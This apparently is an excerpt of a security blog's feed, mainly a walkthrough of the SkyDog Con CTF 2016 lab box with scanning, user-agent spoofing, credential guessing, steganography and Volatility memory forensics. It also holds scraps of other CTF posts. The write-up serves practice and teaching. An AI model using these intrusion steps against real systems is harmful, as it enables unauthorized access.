</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                       I n t e r i o r ,   L e v e l   8
</span><span class='line'>                                       ---------------------------------
</span><span class='line'>                                                  (not shown)
</span><span class='line'>
</span><span class='line'>  The Flight Deck contains the  tractor beam  generators which catapult out-
</span><span class='line'>  going craft into the open sky and reel in landing ships. Pilots relinquish
</span><span class='line'>  control of  their ships during take off and landing because of the limited
</span><span class='line'>  maneuvering area within the chutes.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                           S u b - L e v e l   I n s t a l l a t i o n s
</span><span class='line'>                           ---------------------------------------------
</span><span class='line'>                                            (not shown)
</span><span class='line'>
</span><span class='line'>  A large underground section of the base  houses the main power and back-up
</span><span class='line'>  generators, the tractor beam and deflector shield generators, the environ-
</span><span class='line'>  ment  control  station,  and  the  waste  disposal and refuse units.  Some
</span><span class='line'>  storage facilities are also located here.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'> Version 1.9 (released 941211).
</span><span class='line'> Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob
</span><span class='line'> VanderClay and Joe Rumsey.  The pictures work best when shown on a white on
</span><span class='line'> black screen  (except for some faces)  with a not too fancy font. Contribu-
</span><span class='line'> tions welcome, email to the adress below. Sources LS: The Star Wars Source-
</span><span class='line'> book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-
</span><span class='line'> book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>
</span><span class='line'>  ______  ______  ______  ______  ______  ______  ______  ______  
</span><span class='line'> |______||______||______||______||______||______||______||______||______| 
</span><span class='line'>  _   _   ____ __          __ __     __ ____   _    _  _  _____   ______  
</span><span class='line'> | \ | | / __ \\ \        / / \ \   / // __ \ | |  | |( )|  __ \ |  ____| 
</span><span class='line'> |  \| || |  | |\ \  /\  / /   \ \_/ /| |  | || |  | ||/ | |__) || |__    
</span><span class='line'> | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  __|   
</span><span class='line'> | |\  || |__| |  \  /\  /       | |  | |__| || |__| |   | | \ \ | |____  
</span><span class='line'> |_| \_| \____/    \/  \/        |_|   \____/  \____/    |_|  \_\|______| 
</span><span class='line'>                            _  ______  _____  _____  _                
</span><span class='line'>         /\                | ||  ____||  __ \|_   _|| |               
</span><span class='line'>        /  \               | || |__   | |  | | | |  | |               
</span><span class='line'>       / /\ \          _   | ||  __|  | |  | | | |  | |               
</span><span class='line'>      / ____ \        | |__| || |____ | |__| |_| |_ |_|               
</span><span class='line'>     /_/    \_\        \____/ |______||_____/|_____|(_)               
</span><span class='line'>  ______  ______  ______  ______  ______  ______  ______  ______  ______  
</span><span class='line'> |______||______||______||______||______||______||______||______||______| 
</span><span class='line'>                                                                      
</span><span class='line'>
</span><span class='line'>                I hope you enjoyed this challenge
</span><span class='line'>                Please leave comments & feedback
</span><span class='line'>                @ https://www.vulnhub.com/?q=64base
</span><span class='line'>                -----------------------------------
</span><span class='line'>                64Base Challenge by 3mrgnc3
</span><span class='line'>                https://3mrgnc3.ninja/challenges   
</span><span class='line'>                -----------------------------------
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Peace is a lie, there is only passion.  \
</span><span class='line'>| Through passion, I gain strength.       |
</span><span class='line'>| Through strength, I gain power. Through |
</span><span class='line'>| power, I gain victory. Through victory, |
</span><span class='line'>| my chains are broken. The Force shall   |
</span><span class='line'>\ free me.                                /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SkyDog Con CTF 2016 - Catch Me If You Can]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/"/>
    <updated>2018-10-20T18:53:46+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can</id>
    <content type="html"><![CDATA[<p>For this box, you have to find 8 flags, each containing an MD5 hash.</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -sC -sV -p- 192.168.145.136
</span><span class='line'>
</span><span class='line'>PORT      STATE  SERVICE  VERSION
</span><span class='line'>22/tcp    closed ssh
</span><span class='line'>80/tcp    open   http     Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: SkyDog Con CTF 2016 - Catch Me If You Can
</span><span class='line'>443/tcp   open   ssl/http Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: SkyDog Con CTF 2016 - Catch Me If You Can
</span><span class='line'>| ssl-cert: Subject: commonName=Network Solutions EV Server CA 2/organizationName=Network Solutions L.L.C./stateOrProvinceName=VA/countryName=US
</span><span class='line'>| Not valid before: 2016-09-21T14:51:57
</span><span class='line'>|_Not valid after:  2017-09-21T14:51:57
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>| tls-alpn: 
</span><span class='line'>|   http/1.1
</span><span class='line'>22222/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 b6:64:7c:d1:55:46:4e:50:e3:ba:cf:4c:1e:81:f9:db (RSA)
</span><span class='line'>|   256 ef:17:df:cc:db:2e:c5:24:e3:9e:25:16:3d:25:68:35 (ECDSA)
</span><span class='line'>|_  256 0e:1b:3f:c3:4a:56:a0:ef:4d:2a:af:a1:7e:94:d2:06 (ED25519)</span></code></pre></td></tr></table></div></figure>


<h2>Flag #1 Don’t go Home Frank! There’s a Hex on Your House.</h2>

<p>Starting with the web server, the web page is the homepage of the SkyDog con. Poking through the source, I found a suspicious comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--[If IE4]&gt;&lt;script src="http://chousensha.github.io/oldIE/html5.js"&gt;&lt;/script&gt;&lt;![Make sure to remove this before going to PROD]--&gt; </span></code></pre></td></tr></table></div></figure>


<p>Going to the above mentioned JS file, on the first line we find a hex string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* 666c61677b37633031333230373061306566373164353432363633653964633166356465657d */</span></code></pre></td></tr></table></div></figure>


<p>Decoded, it gives the first flag: <code>flag{7c0132070a0ef71d542663e9dc1f5dee}</code>. And decoding the MD5 hash gives a hint: <code>nmap</code></p>

<h2>Flag #2 Obscurity or Security?</h2>

<p>I already ran Nmap and saw that SSH is listening on port 22222. Trying to SSH as frank gives the next flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh frank@192.168.145.136 -p 22222
</span><span class='line'>The authenticity of host '[192.168.145.136]:22222 ([192.168.145.136]:22222)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '[192.168.145.136]:22222' (ECDSA) to the list of known hosts.
</span><span class='line'>###############################################################
</span><span class='line'>#                         WARNING                             #
</span><span class='line'>#     FBI - Authorized access only!                 # 
</span><span class='line'># Disconnect IMMEDIATELY if you are not an authorized user!!! #
</span><span class='line'>#         All actions Will be monitored and recorded          #
</span><span class='line'># Flag{53c82eba31f6d416f331de9162ebe997}            #
</span><span class='line'>###############################################################
</span><span class='line'>frank@192.168.145.136's password: </span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The decoded hint is <code>encrypt</code></p>

<h2>Flag #3 Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic.</h2>

<p>Remember that Nmap found also port 443 open, so I switched to https to check it out and was greeted by a self-signed certificate. Viewing the certificate gives the third flag: <code>flag3{f82366a9ddc064585d54e3f78bde3221}</code></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/flag3.jpg" title="flag3" alt="flag3"></p>

<p>And the next hint is <code>personnel</code></p>

<h2>Flag #4 A Good Agent is Hard to Find.</h2>

<p>I tried navigating to /personnel on the web server and it gave me the following message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging....</span></code></pre></td></tr></table></div></figure>


<p>So we need a specific user agent. Remembering the included JS file of the first flag, that hinted towards an old Internet Explorer version, I revisited it and searched for the string <em>fbi</em> inside it and found the lines:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* maindev -  6/7/02 Adding temporary support for IE4 FBI Workstations */
</span><span class='line'>/* newmaindev -  5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */</span></code></pre></td></tr></table></div></figure>


<p>So FBI agents use IE4 on their workstations. Cool, nothing catastrophically wrong there. I grabbed an IE4 user agent from <a href="http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,">http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,</a> changed my User Agent to <code>User-Agent: Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)</code>, and went straight to the FBI portal!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/fbiportal.png" title="fbi portal" alt="fbi portal"></p>

<p>The flag is on the page: <code> flag{14e10d570047667f904261e6d08f520f}</code>, and the decoded value is <code>evidence</code></p>

<h2>Flag #5 The Devil is in the Details &ndash; Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices</h2>

<p>Following up on the clue <em>new+flag</em>, I tried navigating to 192.168.145.136/newevidence and a basic authentication prompt asked me for credentials. On the FBI portal we have the message &ldquo;Welcome Agent Hanratty&rdquo;. A quick Google reveals that this is a reference to agent Carl Hanratty from the movie Catch Me If You Can. I went through the dialogue (hint hint) on the <a href="https://www.imdb.com/title/tt0264464/characters/nm0000158">IMDB page</a> to find out Carl&rsquo;s daughter is called Grace (simple? guessable? personal?). I tried some combinations in the pop up until I found the right one is <em>carl.hanratty/Grace</em> (remember the naming convention of doug.perterson)</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/newevidence.png" title="new evidence" alt="new evidence"></p>

<p>The flag is in the Evidence Summary File: <code>flag{117c240d49f54096413dd64280399ea9}</code>. The hint is <code>panam</code></p>

<h2>Flag #6 Where in the World is Frank?</h2>

<p>For this one you have to work with the other 2 files from the page, the image and the PDF invoice. The invoice mentions an encryption consultation project:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/invoice.jpg" title="invoice" alt="invoice"></p>

<p>This might suggest the use of steganography in the image, and this is confirmed if you search for Stefan Hetzl, it turns out he&rsquo;s the author of steghide! And we have the previous hint of panam, which is the passphrase in this case:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide extract -sf image.jpg 
</span><span class='line'>Enter passphrase: 
</span><span class='line'>wrote extracted data to "flag.txt".
</span><span class='line'>root@kali:~/Downloads# cat flag.txt 
</span><span class='line'>flag{d1e5146b171928731385eb7ea38c37b8}
</span><span class='line'>=ILoveFrance
</span><span class='line'>
</span><span class='line'>clue=iheartbrenda</span></code></pre></td></tr></table></div></figure>


<h2>Flag #7 Frank Was Caught on Camera Cashing Checks and Yelling &ndash; I’m The Fastest Man Alive!</h2>

<p>This was a movie reference and I had to look it up in other solutions&hellip;&ldquo;I’m The Fastest Man Alive!&rdquo; is a reference to The Flash, whose real name is Barry Allen. For the next part, log in to SSH with the the username <em>barryallen</em> and the password <em>iheartbrenda</em>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh barryallen@192.168.145.136 -p 22222
</span><span class='line'>[...]
</span><span class='line'>barryallen@skydogconctf2016:~$ cat flag.txt 
</span><span class='line'>flag{bd2f6a1d5242c962a05619c56fa47ba6}</span></code></pre></td></tr></table></div></figure>


<p>And the hint for the last flag is <code>theflash</code>.</p>

<h2>Flag #8 Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!</h2>

<p>Inside barryallen&rsquo;s home there&rsquo;s a 72M ZIP file called security-system.data:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>barryallen@skydogconctf2016:~$ file security-system.data 
</span><span class='line'>security-system.data: Zip archive data, at least v2.0 to extract</span></code></pre></td></tr></table></div></figure>


<p>I transferred it to my machine with scp:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>scp -P 22222 barryallen@192.168.145.136:security-system.data .
</span><span class='line'>###############################################################
</span><span class='line'>#                         WARNING                             #
</span><span class='line'>#     FBI - Authorized access only!                 # 
</span><span class='line'># Disconnect IMMEDIATELY if you are not an authorized user!!! #
</span><span class='line'>#         All actions Will be monitored and recorded          #
</span><span class='line'># Flag{53c82eba31f6d416f331de9162ebe997}            #
</span><span class='line'>###############################################################
</span><span class='line'>barryallen@192.168.145.136's password: 
</span><span class='line'>security-system.data                          100%   71MB   6.6MB/s   00:10    </span></code></pre></td></tr></table></div></figure>


<p>I unzipped the archive, but the file command didn&rsquo;t identify it as something specific, it just said it&rsquo;s data. I ran strings on it and saw various references to memory that seem to be linked to a Windows system. Time for some memory forensics with Volatility!</p>

<p>First, we need to identify what type of image we&rsquo;re working with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module ImageInfo
</span><span class='line'>---------------------------------
</span><span class='line'>Identify information for the image 
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility imageinfo -f data 
</span><span class='line'>Volatility Foundation Volatility Framework 2.6
</span><span class='line'>INFO    : volatility.debug    : Determining profile based on KDBG search...
</span><span class='line'>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
</span><span class='line'>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
</span><span class='line'>                     AS Layer2 : FileAddressSpace (/root/Downloads/data)
</span><span class='line'>                      PAE type : PAE
</span><span class='line'>                           DTB : 0x33e000L
</span><span class='line'>                          KDBG : 0x80545b60L
</span><span class='line'>          Number of Processors : 1
</span><span class='line'>     Image Type (Service Pack) : 3
</span><span class='line'>                KPCR for CPU 0 : 0xffdff000L
</span><span class='line'>             KUSER_SHARED_DATA : 0xffdf0000L
</span><span class='line'>           Image date and time : 2016-10-10 22:00:50 UTC+0000
</span><span class='line'>     Image local date and time : 2016-10-10 18:00:50 -0400</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s an image of a Windows XP machine! Next, let&rsquo;s look at the processes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module PSList
</span><span class='line'>---------------------------------
</span><span class='line'>Print all running processes by following the EPROCESS lists
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility pslist -f data 
</span><span class='line'>Volatility Foundation Volatility Framework 2.6
</span><span class='line'>Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
</span><span class='line'>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
</span><span class='line'>0x867c6830 System                    4      0     57      171 ------      0                                                              
</span><span class='line'>0x86262900 smss.exe                332      4      3       19 ------      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x8623b978 csrss.exe               560    332     10      423      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x865ed020 winlogon.exe            588    332     24      512      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x8662d808 services.exe            664    588     15      263      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x866a5670 lsass.exe               676    588     25      356      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x86358a70 vmacthlp.exe            848    664      1       25      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x86651da0 svchost.exe             860    664     21      202      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x865c2790 svchost.exe             944    664     11      258      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x86554020 svchost.exe            1040    664     82     1287      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x866196b8 svchost.exe            1092    664      5       59      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x8643ca18 svchost.exe            1144    664     17      213      0      0 2016-10-10 21:59:15 UTC+0000                                 
</span><span class='line'>0x866fca88 explorer.exe           1540   1520     14      417      0      0 2016-10-10 21:59:16 UTC+0000                                 
</span><span class='line'>0x8656b4d0 spoolsv.exe            1636    664     15      125      0      0 2016-10-10 21:59:16 UTC+0000                                 
</span><span class='line'>0x86338640 VGAuthService.e        1900    664      2       60      0      0 2016-10-10 21:59:25 UTC+0000                                 
</span><span class='line'>0x8667bda0 vmtoolsd.exe           2012    664      9      271      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x864f6440 wmiprvse.exe            488    860     14      251      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x864fbad0 wscntfy.exe             536   1040      1       31      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x85e5dd48 alg.exe                 624    664      8      110      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x866f98b0 vmtoolsd.exe           1352   1540      7      242      0      0 2016-10-10 21:59:29 UTC+0000                                 
</span><span class='line'>0x86674410 ctfmon.exe             1356   1540      1       79      0      0 2016-10-10 21:59:29 UTC+0000                                 
</span><span class='line'>0x865bea48 CCleaner.exe           1388   1540      5      108      0      0 2016-10-10 21:59:29 UTC+0000                                 
</span><span class='line'>0x865c3d78 cmd.exe                1336   1540      1       30      0      0 2016-10-10 22:00:05 UTC+0000                                 
</span><span class='line'>0x8634fbb8 wuauclt.exe            1884   1040      9      198      0      0 2016-10-10 22:00:13 UTC+0000                                 
</span><span class='line'>0x86260a78 wuauclt.exe            1024   1040      6      172      0      0 2016-10-10 22:00:29 UTC+0000                                 
</span><span class='line'>0x8667b488 notepad.exe             268   1540      1       55      0      0 2016-10-10 22:00:41 UTC+0000                                 
</span><span class='line'>0x8640cc10 cmd.exe                1276   2012      0 --------      0      0 2016-10-10 22:00:49 UTC+0000   2016-10-10 22:00:50 UTC+0000 </span></code></pre></td></tr></table></div></figure>


<p>I took note of that Notepad process and several cmd.exes and then dumped the files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module FileScan
</span><span class='line'>---------------------------------
</span><span class='line'>Pool scanner for file objects
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility filescan -f data &gt; filelist.txt
</span><span class='line'>Volatility Foundation Volatility Framework 2.6</span></code></pre></td></tr></table></div></figure>


<p>I searched for the string code in the resulting list of files and got a hit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep "code" filelist.txt 
</span><span class='line'>0x0000000005e612f8      1      0 -W-r-- \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
</span><span class='line'>0x00000000062e04b0      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\test\Recent\code.txt.lnk
</span><span class='line'>0x00000000064900a0      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\unicode.nls
</span><span class='line'>0x0000000006640bc8      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt</span></code></pre></td></tr></table></div></figure>


<p>Maybe this code.txt file is connected to the running Notepad process. I used Volatility&rsquo;s notepad plugin to dump the text found into Notepad:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module Notepad
</span><span class='line'>---------------------------------
</span><span class='line'>List currently displayed notepad text
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility notepad -f data 
</span><span class='line'>Volatility Foundation Volatility Framework 2.6
</span><span class='line'>Process: 268
</span><span class='line'>Text:
</span><span class='line'>?
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>d
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>?
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d</span></code></pre></td></tr></table></div></figure>


<p>We have a hex string! Decoding it yields the final flag: <code>flag{841dd3db29b0fbbd89c7b5be768cdc81}</code>. And the decoded value for the last flag is <code>Two[space]little[space]mice</code></p>

<p>This is it for the SkyDog Con CTF machine! I particularly liked the memory forensics part at the end!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ Q: Do you know what the death rate \
</span><span class='line'>\ around here is? A: One per person. /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Git me some Irn-Bru ye Teuchter!]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/"/>
    <updated>2018-10-14T15:21:15+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is called Teuchter, and yes, apparently that&rsquo;s a word. There is a theme for this machine, and this why this blog post is also..different. ye will need to hang tight to yer sanity for this one. Or drink some Irn-Bru. Ah had to look at other walkthroughs when Ah got stuck and some time was spent checking Scottish references, but it was all worth it!</p>

<p>So, what&rsquo;s a Teuchter? The Wiktionary definition is:</p>

<blockquote><p>(derogatory) A Highlander especially if Gaelic-speaking; a rural Scot in general; (in Glasgow and
surrounding areas) a Scot with a thick accent from outside west-central Scotland.</p></blockquote>

